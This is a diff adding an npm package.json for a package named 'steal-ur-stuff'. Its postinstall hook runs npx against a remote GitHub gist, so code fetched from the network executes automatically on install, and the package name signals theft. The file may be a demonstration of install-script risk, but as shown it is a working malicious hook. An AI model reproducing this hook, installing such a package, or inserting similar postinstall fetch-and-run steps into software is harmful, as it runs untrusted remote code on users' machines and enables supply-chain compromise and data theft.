@@ -1,0 +1,12 @@
+{
+  "name": "steal-ur-stuff",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "postinstall": "npx https://gist.github.com/tanepiper/6cb9067adca626cd2c0edbc3786dad7b"
+  },
+  "author": "",
+  "license": "ISC"
+}
